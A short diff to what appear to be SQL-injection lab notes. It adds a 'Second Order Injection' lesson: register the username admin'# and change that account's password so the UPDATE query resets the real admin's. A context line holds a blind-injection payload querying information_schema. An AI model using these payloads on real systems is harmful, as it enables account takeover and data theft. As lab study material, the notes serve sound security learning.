@@ -128,9 +128,15 @@ username: ' or if((select ascii(substr((select column_name from information_sche
 
 ```
 
-
+###  Lesson 24 Second Order Injection
 
 ```
+Register a new user, use admin’#as username.
+Login as admin'# and change your password to, for example, 1234.
+The source code is:
+
+UPDATE users SET PASSWORD='1234' where username='admin'#' and password='$curr_pass'+
+
 
 
 ```
